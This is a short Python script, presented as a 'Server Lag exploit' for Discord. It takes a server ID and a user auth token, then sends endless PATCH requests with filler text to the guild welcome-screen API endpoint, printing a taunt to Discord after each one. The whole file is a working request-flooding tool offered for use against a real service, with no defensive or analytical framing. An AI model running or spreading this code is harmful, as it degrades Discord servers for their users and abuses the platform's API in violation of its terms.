import requests, random

class Exploit():

	def __init__(self, token):
		self.token = token
	def lag(self, serverid):
		x = random.randint(1,99999)
		while True:
			y=requests.patch("https://discordapp.com/api/v8/guilds/"+serverid+"/welcome-screen",headers={"Authorization": self.token},json={"description": f"{str(x)} iosjdweifhwehfiewhfioewhfiooiehfoiwehfoihefoiheofheiofhoiewhfoihefoihewoifheiwohfoiwehfeohefiowhfoiewhfoihefoihefiehfoiwehfoiehfii"})
			print("Sent a request! Try harder next time discord.")
def main():
	print("Server Lag exploit, should be patched very soon.\nRequirements: MANAGE_SERVER perms")
	servid=input("\033[92mServer id : ")
	token=input("\033[91mAuth (token) : ")
	x = Exploit(token=token)
	x.lag(servid)
if __name__ == '__main__':
	main()
